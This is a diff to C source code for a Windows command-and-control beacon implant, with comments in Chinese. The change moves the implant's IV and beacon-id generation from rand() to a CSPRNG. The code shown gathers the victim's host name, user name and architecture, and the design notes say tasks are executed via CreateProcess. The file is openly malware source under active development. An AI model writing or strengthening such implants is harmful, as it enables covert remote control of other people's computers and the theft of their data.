@@ -5,7 +5,8 @@
  *
  * v1 边界（docs/c2-design.md）：
  *  - 无持久化（进程结束即消亡）
- *  - IV 来自 rand()（srand=GetTickCount）
+ *  - IV 与 beacon id 来自 CSPRNG（BCryptGenRandom，失败退 RtlGenRandom）；
+ *    jitter 仍用 rand()（非密码学用途）
  *  - 无规避层：正常进程、明文 PE、CreateProcess 执行
  *  - 任务输出上限 64KB
  */
@@ -309,7 +310,7 @@ int main(void)
     if (hex2bytes(_STR2(C2_PSK_HEX), PSK, sizeof PSK) != 0) return 1;
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
-    srand((unsigned)GetTickCount());
+    srand((unsigned)GetTickCount()); /* 仅 jitter 用（非密码学）；IV/id 走 CSPRNG */
 
     char host[64], user[64], arch[32], id[96];
     DWORD sz;
@@ -317,7 +318,11 @@ int main(void)
     sz = sizeof user; GetUserNameA(user, &sz);
     const char *arch_env = getenv("PROCESSOR_ARCHITECTURE");
     snprintf(arch, sizeof arch, "%s", arch_env ? arch_env : "x64");
-    snprintf(id, sizeof id, "%s-%04X", host, (unsigned)rand() & 0xFFFF);
+    /* beacon id 随机源改 CSPRNG；线上格式不变（仍为 host-%04X，16 位十六进制） */
+    uint8_t id_rand[2];
+    if (cmt1_random_bytes(id_rand, sizeof id_rand) != 0) return 1;
+    snprintf(id, sizeof id, "%s-%04X", host,
+             ((unsigned)id_rand[0] << 8) | (unsigned)id_rand[1]);
 
     int sleep_s = atoi(env_or("C2_SLEEP", "0"));
     if (sleep_s <= 0) sleep_s = C2_SLEEP;
